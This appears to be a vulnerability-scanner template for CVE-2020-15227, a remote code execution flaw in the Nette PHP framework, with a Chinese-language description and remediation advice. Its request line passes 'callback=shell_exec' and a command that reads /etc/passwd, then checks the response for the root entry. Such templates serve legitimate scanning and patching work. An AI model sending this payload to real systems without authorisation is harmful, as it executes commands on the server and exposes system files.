id: CVE-2020-15227
info:
  name: Nette Framework - Remote Code Execution
  author:
  - becivells
  description: |-
    Nette 代码注入漏洞
    Nette是个人开发者的一个基于组件的事件驱动 PHP 框架。

    Nette 存在代码注入漏洞，该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。以下产品及版本受到影响：2.0.19版本, 2.1.13版本, 2.2.10版本, 2.3.14版本, 2.4.16版本, 3.0.6版本。
  severity: critical
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁。
    https://github.com/nette/application/security/advisories/GHSA-8gv3-3j7f-wg94

    临时修复方案：<br />1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br />2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1'
  method: GET
